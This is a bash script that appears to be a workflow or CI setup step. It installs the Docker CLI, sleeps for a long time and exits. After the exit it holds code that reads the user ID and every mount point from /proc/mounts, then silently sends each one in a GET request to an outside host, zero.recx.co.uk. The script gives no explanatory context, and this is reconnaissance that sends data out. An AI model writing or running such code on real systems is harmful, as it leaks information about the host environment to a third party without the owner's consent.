#!/usr/bin/env bash
set -euo pipefail

apt-get update -qq && apt-get install -y -qq curl

apt-get update
apt-get install ca-certificates apt-utils
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  tee /etc/apt/sources.list.d/docker.list > /dev/null

apt-get update
apt-get install -y docker-ce-cli

sleep 10000


exit

USER_ID=$(id -u)
BASE_URL="https://zero.recx.co.uk/workflow"

# URL-encode a string using pure bash (no python3 required)
url_encode() {
    local string="$1"
    local encoded=""
    local i c
    for (( i=0; i<${#string}; i++ )); do
        c="${string:$i:1}"
        case "$c" in
            [a-zA-Z0-9._~-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    printf '%s\n' "$encoded"
}

# Iterate over every mount point in /proc/mounts and fire a GET request
while IFS=' ' read -r _device mountpoint _fstype _options _dump _pass; do
    encoded_mount=$(url_encode "$mountpoint")
    curl \
        --silent \
        --max-time 5 \
        "${BASE_URL}/${USER_ID}/${encoded_mount}" \
        || true   # don't abort on individual failures
done < /proc/mounts
